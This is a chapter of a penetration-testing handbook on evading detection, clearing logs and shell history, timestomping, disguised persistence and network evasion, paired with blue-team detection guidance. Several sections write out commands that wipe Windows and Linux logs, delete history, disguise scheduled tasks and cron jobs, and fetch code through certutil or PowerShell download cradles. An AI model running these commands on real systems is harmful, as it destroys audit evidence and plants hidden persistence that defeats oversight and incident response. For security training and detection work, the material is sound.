---
---

# Detection, Evasion, and Clearing Tracks

> **Privilege Escalation Handbook** — File 08  
> OPSEC, evasion concepts, log hygiene, and forensic awareness  
> **Authorized engagements only.** Many techniques are dual-use; defenders should use this file to strengthen detection. Always follow Rules of Engagement (ROE) — some clients forbid log deletion or evasion testing.

---

## Table of Contents

1. [Engagement Ethics & ROE](#1-engagement-ethics--roe)
2. [Detection Landscape Overview](#2-detection-landscape-overview)
3. [Living Off the Land (LOLBins)](#3-living-off-the-land-lolbins)
4. [Process Injection Concepts](#4-process-injection-concepts)
5. [Obfuscation Techniques](#5-obfuscation-techniques)
6. [Anti-Debugging & Anti-VM (Awareness)](#6-anti-debugging--anti-vm-awareness)
7. [Linux Log & Artifact Clearing](#7-linux-log--artifact-clearing)
8. [Windows Log & Artifact Clearing](#8-windows-log--artifact-clearing)
9. [Shell History & File Cleanup](#9-shell-history--file-cleanup)
10. [Network Evasion](#10-network-evasion)
11. [Stealth Persistence Patterns](#11-stealth-persistence-patterns)
12. [Forensic Awareness & Anti-Forensics](#12-forensic-awareness--anti-forensics)
13. [Blue Team Detection Opportunities](#13-blue-team-detection-opportunities)
14. [References](#14-references)

---

## 1. Engagement Ethics & ROE

### 1.1 Before You Hide Anything

Confirm whether the client allows:

| Activity | Often allowed? | Notes |
|----------|----------------|-------|
| AV/EDR bypass testing | Sometimes | Scoped hosts only |
| Log deletion | Rarely | Breaks blue team value |
| Disabling security tools | Rarely | Outage risk |
| Persistence | Sometimes | Must clean up |
| Memory-only payloads | Common in RT | Still document |

> **Warning:** Deleting production logs without approval can violate contract, law, and destroy incident-response capability. Prefer **minimal footprint** over **destructive cover-up** unless ROE explicitly tests detection/response.

### 1.2 Professional Defaults

1. Minimize noise rather than wipe evidence.  
2. Record every change for cleanup.  
3. If testing evasion, do it on designated hosts with monitoring restored after.  
4. Never teach or use these methods on systems you do not own or have written authorization to test.

---

## 2. Detection Landscape Overview

### 2.1 Layers

| Layer | Examples | Catches |
|-------|----------|---------|
| **AV** | Windows Defender, ClamAV | Known malware on disk |
| **EDR** | Crowdstrike, Defender ATP, SentinelOne | Behavior, memory, lineage |
| **NDR / Net logs** | Zeek, firewall, proxy | C2, exfil, beaconing |
| **SIEM** | Splunk, Elastic, Sentinel | Correlated events |
| **Sysmon / auditd** | Host telemetry | Granular process/file/registry |
| **Identity** | Entra, Okta, AD logs | Auth anomalies |

### 2.2 What Modern EDR Cares About

- Process **ancestry** (Office → cmd → powershell → unknown)  
- **Rare** parent/child pairs  
- LSASS access  
- Privilege escalation API sequences  
- Encoded PowerShell  
- Unsigned drivers / vulnerable driver loads  
- Persistence creation  
- Network to rare destinations  

### 2.3 Red Team Implication

“Undetected” is temporary and environment-specific. Design for **dwell time needed for objectives**, not mythical invisibility.

---

## 3. Living Off the Land (LOLBins)

### 3.1 Concept

Use **signed, trusted OS binaries** to download, execute, compile, or persist — blending with admin activity.

Catalogs:

- [LOLBAS](https://lolbas-project.github.io/) (Windows)  
- [GTFOBins](https://gtfobins.github.io/) (Unix — dual purpose)  
- [GTFOArgs](https://gtfobins.github.io/) / LOLdrivers  

### 3.2 Windows Examples (Defensive + Offensive Awareness)

| Binary | Abusable capability |
|--------|---------------------|
| `certutil` | Download / decode |
| `bitsadmin` / BITS PowerShell | Transfer |
| `mshta` | Execute HTA/JavaScript |
| `regsvr32` | COM scriptlets (historical squiblydoo) |
| `rundll32` | Run exports |
| `wmic` | Process call create (legacy) |
| `powershell` | Everything |
| `cmd` + `for` loops | Scripting without files |
| `installutil` / `msbuild` | Execute code via trusted compilers |
| `curl.exe` (modern Win) | Download |

### 3.3 Linux Examples

| Binary | Use |
|--------|-----|
| `curl` / `wget` | Tool fetch |
| `python` / `perl` | Execution |
| `dd` / `tar` / `cp` | Staging |
| `systemctl` / `cron` | Persistence |
| `ssh` | Tunneling |
| `openssl` | Encoded transfer |

### 3.4 Why It Helps Attackers

- Lower static AV hit rate  
- May bypass simple application allow-lists if LOLBin is permitted  
- Looks closer to IT operations  

### 3.5 Why Defenders Still Catch It

- Command-line logging  
- Network destination reputation  
- Parent/child baselining  
- Script block logging / auditd rules  

> **Pro tip:** LOLBins are not magic. `certutil -urlcache -f http://evil` is one of the most monitored patterns in enterprise SOC rulesets.

---

## 4. Process Injection Concepts

### 4.1 Why Inject?

- Hide code inside trusted processes (e.g., `explorer.exe`)  
- Steal tokens from other processes  
- Evade simple process-name blocks  

### 4.2 Common Classes (Conceptual)

| Technique | Idea | ATT&CK |
|-----------|------|--------|
| Classic remote thread | Write memory + CreateRemoteThread | T1055 |
| APC injection | Queue APC to thread | T1055.004 |
| Process hollowing | Start suspended, replace image | T1055.012 |
| Module stomping | Overwrite loaded module space | T1055 |
| Reflective DLL | Load without LoadLibrary | T1620 related |
| PPID spoofing | Fake parent process | T1502 |

### 4.3 Practical Notes for Operators

- Highly EDR-instrumented (ETW, kernel callbacks)  
- Lab success ≠ production success  
- Prefer **legitimate remote admin channels** (WinRM, SSH, cloud APIs) when possible for objectives  

### 4.4 Detection Angles

- Cross-process memory write + thread start  
- Unbacked executable memory (RWX)  
- Suspicious call stacks  
- Rare injection into LSASS / csrss (should almost never happen from user tools)

---

## 5. Obfuscation Techniques

### 5.1 PowerShell Obfuscation

Patterns defenders flag:

```powershell
# EncodedCommand
powershell -enc <base64>
# IEX download cradle
IEX (New-Object Net.WebClient).DownloadString('http://...')
# String concatenation / -join / replace chains
# AMSI bypass snippets (extremely well signatured)
```

**Operator guidance:** Custom, purpose-built tooling beats public obfuscators that every EDR trains on. For exams/labs, encoding is often enough; for enterprise, assume **Script Block Logging** sees the decoded content.

### 5.2 Command-Line Obfuscation

- Extra whitespace / caret escape in cmd (`who^ami`)  
- Environment variable indirection  
- Short names (`C:\Progra~1\...`)  
- Alternate data streams execution (legacy interest)

### 5.3 Binary Packing / Crypting

Packers reduce signature hits briefly; behavioral detection remains. Signed malware and sideloading are more relevant in mature environments than UPX alone.

### 5.4 Script Languages

Python/Perl pyinstaller bundles, bash `eval` chains, JScript — each has telemetry on modern endpoints.

### 5.5 AMSI / Script Logging (Awareness)

Windows AMSI inspects script content at runtime. Public “AMSI bypass” one-liners are among the **most detected** artifacts globally. Treat them as lab curiosities unless you have advanced custom research capability and explicit ROE.

---

## 6. Anti-Debugging & Anti-VM (Awareness)

### 6.1 Why Malware Uses Them

Delay analysis in sandboxes; frustrate reverse engineers.

### 6.2 Common Checks (Educational)

| Check | Idea |
|-------|------|
| Debugger present APIs | `IsDebuggerPresent` family |
| Timing | Detect single-step slowdown |
| VM MAC prefixes / drivers | VMware/VirtualBox artifacts |
| CPU core / RAM thresholds | Sandbox minimums |
| Human interaction | Mouse movement requirements |

### 6.3 Red Team Reality

Enterprise targets are often **real workstations and cloud VMs**. Aggressive anti-VM may **break your own beacon** on legitimate VDI. Use sparingly and intentionally.

### 6.4 Defender View

Sandbox evasion is expected; detonate on real hardware, use hardware-assisted analysis, and focus on **C2 behavior** after execution.

---

## 7. Linux Log & Artifact Clearing

### 7.1 Important Logs

| Log / file | Content |
|------------|---------|
| `/var/log/auth.log` | SSH, sudo (Debian/Ubuntu) |
| `/var/log/secure` | Auth (RHEL family) |
| `/var/log/syslog` / `messages` | General system |
| `/var/log/httpd/*` `/var/log/nginx/*` | Web |
| `/var/log/audit/audit.log` | auditd |
| `~/.bash_history` | Commands |
| `/var/run/utmp` `wtmp` `btmp` | Logins |
| `lastlog` | Last login DB |
| journald | `journalctl` binary logs |

### 7.2 Viewing Before Touching

```bash
journalctl -u ssh -n 50
grep "Accepted\|sudo" /var/log/auth.log | tail
last -a | head
who
```

### 7.3 Clearing Approaches (Authorized Only)

**Destructive wipe (loud / obvious to IR):**

```bash
# Examples of what attackers historically do — detect these
cat /dev/null > /var/log/auth.log
truncate -s 0 /var/log/syslog
```

**Selective line removal (still risky / inconsistent):**

```bash
sed -i '/10.10.14.5/d' /var/log/auth.log
```

**journald:**

```bash
journalctl --rotate
journalctl --vacuum-time=1s
# or rm journal files if permissions allow — highly obvious
```

### 7.4 utmp / wtmp / btmp

```bash
# View
who
last
lastb
# Tampering requires specialized tools; crude truncation breaks format
```

Defenders notice empty or inconsistent utmp databases.

### 7.5 auditd

If auditd is active, clearing without stopping service regenerates evidence of tampering. `auditctl` rules may log the wipe itself.

### 7.6 Better OPSEC Than Wiping

- Use **SSH keys** and jump hosts already trusted  
- Avoid failed logins  
- Avoid interactive root when possible  
- Keep activity within expected admin patterns  
- Use in-memory techniques without writing tools to disk  

---

## 8. Windows Log & Artifact Clearing

### 8.1 Primary Event Logs

| Log | Interest |
|-----|----------|
| Security | Logon 4624/4625, explicit cred 4648, etc. |
| System | Service installs, driver loads |
| Application | App errors |
| PowerShell | Script block 4104, module logging |
| Sysmon | If installed — process/network/file |
| Microsoft-Windows-TerminalServices-* | RDP |
| Windows PowerShell / Operational | PS activity |

### 8.2 Clearing Event Logs (Requires Privilege)

```cmd
wevtutil el
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
```

```powershell
Clear-EventLog -LogName Security
Get-WinEvent -ListLog * | ForEach-Object { wevtutil cl $_.LogName }  # extremely loud / harmful
```

> **Warning:** Mass log clear is a **high-fidelity SOC alert** (Event ID 1102 — audit log cleared). Often worse OPSEC than leaving logs.

### 8.3 PowerShell History

```powershell
Get-History
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath
# Default path often:
# $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### 8.4 Prefetch / ShimCache / Amcache

| Artifact | Path / store | Notes |
|----------|--------------|-------|
| Prefetch | `C:\Windows\Prefetch\*.pf` | Evidence of execution |
| ShimCache | Registry SYSTEM | Execution evidence |
| Amcache | `Amcache.hve` | Program inventory |
| BAM/DAM | Registry | User execution |

Deleting prefetch needs admin; defenders use multiple overlapping artifacts — deleting one rarely erases history.

### 8.5 USN Journal / MFT

Advanced anti-forensics targets NTFS metadata; modern IR still recovers substantial activity from EDR telemetry off-host.

### 8.6 Scheduled Task / Service History

SCM and task scheduler leave files under `C:\Windows\System32\Tasks` and registry — clean persistence properly rather than only wiping logs.

---

## 9. Shell History & File Cleanup

### 9.1 Linux History

```bash
# Disable for session (authorized OPSEC)
unset HISTFILE
export HISTSIZE=0
set +o history   # bash

# Clear existing
history -c
rm -f ~/.bash_history ~/.zsh_history
# Or selective
sed -i '/msfvenom\|linpeas\|nc /d' ~/.bash_history
```

Note: some systems use centralized logging of shell commands (auditd `execve`).

### 9.2 Secure Delete Myths

```bash
shred -u tool.bin
wipe tool.bin
```

On **SSDs and cloud disks**, shred may not securely erase due to wear leveling and snapshots. Cloud volume snapshots can retain data regardless.

### 9.3 Temp File Hygiene

```bash
rm -rf /tmp/.enum* /dev/shm/.e* 2>/dev/null
rm -f /tmp/linpeas.sh /tmp/a.out
```

Windows:

```cmd
del /f /q C:\Users\Public\*.exe
del /f /q %TEMP%\*.exe
```

### 9.4 Timestomping

```bash
touch -r /bin/ls /tmp/backdoor
# or timedatectl / touch -t
```

Windows: tools to alter `$SI` / `$FN` timestamps — known to IR; also leaves its own traces.

### 9.5 Prefer Non-Persistence

Best cleanup is **never writing** the artifact: memory-only execution, existing admin channels, cloud API actions that look like DevOps.

---

## 10. Network Evasion

### 10.1 Port & Protocol Choices

| Choice | Rationale | Risk |
|--------|-----------|------|
| 443/TCP HTTPS | Blends with web | TLS inspection / JA3 |
| 80/HTTP | Common | Content inspection |
| 53/DNS | Sometimes open | DNS exfil highly monitored in mature orgs |
| ICMP | Rare allow | Anomalous size/timing |
| SMB/WinRM internal | Looks admin | Lateral movement rules |

### 10.2 Domain Fronting / CDN / Redirectors

Historically used to hide C2 behind trusted domains; many providers cracked down. Redirector chains (VPS hop points) remain standard red team infrastructure — keep out of client IP space reputation issues.

### 10.3 DNS Tunneling (Concept)

Encode data in DNS queries/responses (dnscat2, iodine, etc.). **Slow**; distinctive query patterns; easy win for detections if DNS logging exists.

### 10.4 Proxy-Aware Payloads

Enterprise hosts often **must** use HTTP proxy. Payloads that ignore proxy fail; proxy-aware C2 succeeds but appears in proxy logs — still better than non-functional beacons.

### 10.5 SSH / SOCKS Pivoting

```bash
ssh -D 9050 user@jump
proxychains nmap ...
```

```bash
# Meterpreter
portfwd
route
```

### 10.6 Traffic Padding & Jitter

Beacons with jitter and reasonable sleep evade simple “regular interval” rules but not full decryption + behavioral UEBA.

### 10.7 Host Firewall Stealth

Avoid enabling new listening ports on well-monitored servers; reverse connects usually preferred.

---

## 11. Stealth Persistence Patterns

Only with ROE approval; always inventory for removal.

### 11.1 Linux: systemd Timers

```bash
# User-level less visible than /etc sometimes
mkdir -p ~/.config/systemd/user/
# service + timer unit that runs infrequently
systemctl --user enable --now sync.timer
```

System-level:

```bash
# /etc/systemd/system/backup.service + backup.timer
# Disguised as backup/monitoring names
```

### 11.2 Linux: Cron Disguise

```cron
# Looks similar to existing entries
17 * * * * root /usr/local/bin/logrotate-helper >/dev/null 2>&1
```

Use names matching the environment; defenders baseline cron.

### 11.3 Windows: WMI Event Subscriptions

Permanent WMI subscriptions can launch payloads on events (logon, timed). Harder for juniors to find; Autoruns / dedicated hunters catch them.

### 11.4 Windows: Disguised Scheduled Tasks

```cmd
schtasks /create /tn "\Microsoft\Windows\DesktopMgmt\ConfigSync" /tr "C:\ProgramData\msync\update.exe" /sc hourly /ru SYSTEM
```

Abuse of **Microsoft\** namespace style names — still visible to inventory tools.

### 11.5 DLL Sideload Persistence

Plant malicious DLL next to signed auto-start app — may blend with app updates.

### 11.6 Cloud Persistence (Related to File 06)

- Backdoor IAM users/keys  
- Malicious Lambda triggers  
- GitHub Actions workflow on schedule  
- Modified container images in registry  

Often **more durable** than host malware and missed by host EDR.

---

## 12. Forensic Awareness & Anti-Forensics

### 12.1 What IR Will Look At

| Source | Survives local wipe? |
|--------|----------------------|
| EDR cloud timeline | Yes |
| SIEM forwarded logs | Yes |
| NetFlow / proxy | Yes |
| Cloud audit (CloudTrail) | Yes |
| Local EVTX only | No if wiped pre-forward |
| Memory image | If captured live |
| Backups / snapshots | Often yes |

**Key lesson:** Local anti-forensics fails against **centralized telemetry**. True OPSEC is reducing malicious *signal*, not scrubbing one host.

### 12.2 Anti-Forensics Categories

1. **Data hiding** — ADS, stego, slack space (limited modern value)  
2. **Artifact destruction** — log clear, file delete  
3. **Trail fabrication** — false logs (rare, complex)  
4. **Encryption** — ransomware-style (out of scope / illegal without auth)  
5. **Time manipulation** — timestomp, clock skew  

### 12.3 Memory vs Disk

Memory-only payloads reduce disk forensics but:

- Still generate network detections  
- Still generate EDR behavioral events  
- Crash dumps / hibernation may capture memory  

### 12.4 Report-Friendly Language

When documenting evasion tests for clients:

```text
Emulated adversary technique T1070.001 (Clear Windows Event Logs) on HOST01
with explicit ROE approval. Security log clear generated Event ID 1102,
which SOC detected in 4 minutes. Recommendation: alert on 1102 + correlate
with privileged logons.
```

Turn red actions into **blue detection quality metrics**.

---

## 13. Blue Team Detection Opportunities

### 13.1 High-Fidelity Alerts

| Event | Why |
|-------|-----|
| Security log cleared (1102) | Almost always investigate |
| Sysmon config changed | Tamper |
| Unexpected service ImagePath change | Privesc/persist |
| LSASS access by non-AV | Cred dump |
| New local admin | Persistence |
| `certutil` + URL | LOLBin download |
| Encoded PowerShell from Office | Phish chain |
| Privileged container start | K8s escape prep |
| CloudTrail `CreateAccessKey` on admin | Cloud persist |
| Disable Defender / uninstall EDR | Tamper |

### 13.2 Hardening That Beats Cleverness

- Central log immutability (WORM / separate SIEM account)  
- EDR with tamper protection  
- Application allow-listing (WDAC)  
- Least privilege + no standing local admin  
- Script block logging + Command line auditing  
- Cloud: SCPs, PIM/JIT, short-lived credentials  
- Immutable CI runners + signed artifacts  

### 13.3 Purple Team Loop

1. Red uses technique from this handbook  
2. Blue measures detect/prevent time  
3. Tune analytics  
4. Retest  

This file’s highest professional value is **closing that loop**, not “winning” invisibility permanently.

---

## 14. References

- [MITRE ATT&CK — Defense Evasion](https://attack.mitre.org/tactics/TA0005/)  
- [MITRE ATT&CK T1070](https://attack.mitre.org/techniques/T1070/) Indicator Removal  
- [MITRE ATT&CK T1055](https://attack.mitre.org/techniques/T1055/) Process Injection  
- [MITRE ATT&CK T1218](https://attack.mitre.org/techniques/T1218/) System Binary Proxy Execution  
- [LOLBAS](https://lolbas-project.github.io/)  
- [Microsoft Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)  
- [Microsoft — Command line process auditing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing)  
- [Sigma rules](https://github.com/SigmaHQ/sigma) — open detection rules  
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) — test mappings  
- [OSSEC/Wazuh log analysis docs](https://documentation.wazuh.com/)  
- [NIST SP 800-61](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final) Incident handling  

---

## Appendix A: OPSEC Checklist (Red)

- [ ] ROE reviewed for evasion/log tampering  
- [ ] Prefer LOLBins / admin protocols over custom malware when sufficient  
- [ ] Avoid public AMSI/UAC one-liners on mature EDR  
- [ ] Minimize disk writes; clean staging dirs  
- [ ] Do not mass-clear logs unless testing IR  
- [ ] Inventory all persistence  
- [ ] Document for cleanup and purple team notes  
- [ ] Assume SIEM already has copies  

## Appendix B: IR Checklist (Blue)

- [ ] Alert on log clear / EDR tamper  
- [ ] Forward logs off-box immutably  
- [ ] Baseline LOLBin usage  
- [ ] Hunt persistence (tasks, WMI, services, systemd)  
- [ ] Compare disk wipe claims against proxy/EDR/cloud  
- [ ] Preserve memory if live response allows  
- [ ] Rotate credentials after suspected token theft  

## Appendix C: “Quiet” vs “Loud” Actions

| Quieter | Louder |
|---------|--------|
| Existing SSH/WinRM | New reverse shell exe |
| Cloud API with stolen role | Kernel exploit |
| Read access abuse | Disable AV |
| Selective staging in memory | LinPEAS full + tooling drop |
| Normal business ports | DNS tunnel megabytes |

## Appendix D: Legal Reminder

Unauthorized access, sabotage of logs on systems you do not own, or interference with evidence in real investigations can be **criminal**. This handbook is for **lawful** security testing, education, and defense.

---

*End of File 08 — Detection, Evasion, and Clearing Tracks*  
*End of Privilege Escalation Handbook (Files 01–08)*

---

## Handbook Index

| File | Topic |
|------|-------|
| 01 | Linux Enumeration Deep Dive |
| 02 | Linux Privilege Escalation Techniques |
| 03 | Windows Privilege Escalation Concepts |
| 04 | Windows Privilege Escalation Techniques |
| 05 | Reverse Shells, Stabilisation, and Tools |
| 06 | Modern Cloud and Container Privilege Escalation |
| 07 | Automated Tools and Resources |
| 08 | Detection, Evasion, and Clearing Tracks |

**Use responsibly. Get authorization. Help defenders improve.**
